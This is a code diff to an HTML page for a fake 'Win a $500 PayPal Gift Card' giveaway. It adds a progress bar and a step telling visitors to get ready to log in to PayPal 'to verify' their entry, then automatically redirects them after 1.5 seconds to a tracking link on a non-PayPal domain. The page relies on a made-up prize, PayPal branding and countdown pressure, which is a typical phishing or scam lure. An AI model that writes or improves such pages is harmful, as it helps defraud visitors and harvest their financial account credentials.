@@ -5,14 +5,12 @@
   <title>Win a $500 PayPal Gift Card!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-  <!-- Open Graph for social sharing -->
+  <!-- Open Graph & Twitter -->
   <meta property="og:title" content="Win a $500 PayPal Gift Card!" />
   <meta property="og:description" content="Join now for a chance to win – only 1 day left!" />
   <meta property="og:image" content="https://trovanta.net/share-preview.jpg" />
   <meta property="og:url" content="https://trovanta.net/" />
   <meta property="og:type" content="website" />
-
-  <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="Win a $500 PayPal Gift Card!" />
   <meta name="twitter:description" content="Join now for a chance to win – offer expires soon!" />
@@ -37,7 +35,6 @@
       justify-content: center;
       text-align: center;
       padding: 20px;
-      transition: background-image 0.5s ease-in-out;
       position: relative;
     }
 
@@ -56,6 +53,16 @@
       height: 100vh;
       background: rgba(0, 0, 0, 0.4);
       z-index: -1;
+    }
+
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 8px;
+      background-color: #0070ba;
+      transition: width 0.4s ease;
+      z-index: 10;
     }
 
     .container {
@@ -102,12 +109,25 @@
       border-radius: 8px;
       display: inline-block;
       margin: 10px auto;
-      transition: background 0.3s;
+      transition: transform 0.2s ease, background 0.3s;
       cursor: pointer;
     }
 
-    .button:hover {
+    .button:active {
+      transform: scale(0.95);
       background-color: #005ea6;
+    }
+
+    .loading {
+      font-size: 1em;
+      margin-top: 20px;
+      color: #888;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
     }
 
     @media (max-width: 480px) {
@@ -132,6 +152,8 @@
   </style>
 </head>
 <body>
+  <div class="progress-bar" id="progress" style="width: 33%;"></div>
+
   <div class="container" id="stepContainer">
     <h1>Win a $500 PayPal Gift Card!</h1>
     <div class="subtitle">🎉 3 simple steps to enter – don’t miss out!</div>
@@ -141,12 +163,15 @@
       <button class="button" onclick="nextStep()">No</button>
     </div>
     <p class="timer">⏰ Time left: <span id="countdown">05:00</span></p>
+    <p id="loading" class="loading" style="display:none;">Redirecting to PayPal verification page...</p>
   </div>
 
   <script>
     let step = 1;
     const question = document.getElementById('question');
     const options = document.getElementById('options');
+    const loadingText = document.getElementById('loading');
+    const progressBar = document.getElementById('progress');
 
     function nextStep() {
       step++;
@@ -157,14 +182,21 @@
           <button class="button" onclick="nextStep()">Bills</button>
           <button class="button" onclick="nextStep()">Shopping</button>
         `;
+        progressBar.style.width = "66%";
       } else if (step === 3) {
-        question.textContent = "Ready to confirm your chance?";
+        question.textContent = "Almost done!";
         options.innerHTML = `
-          <a class="button" href="https://ky91x.bemobtrk.com/go/23253cf5-dd23-43f1-b41e-dfa2ae9198ca?" target="_blank">Claim Now</a>
+          <p>Please prepare to log in to your PayPal account to verify and complete the entry.</p>
         `;
+        progressBar.style.width = "100%";
+        loadingText.style.display = 'block';
+        setTimeout(() => {
+          window.location.href = "https://ky91x.bemobtrk.com/go/23253cf5-dd23-43f1-b41e-dfa2ae9198ca?";
+        }, 1500);
       }
     }
 
+    // Countdown Timer
     let time = 300;
     const countdownEl = document.getElementById('countdown');
     setInterval(() => {
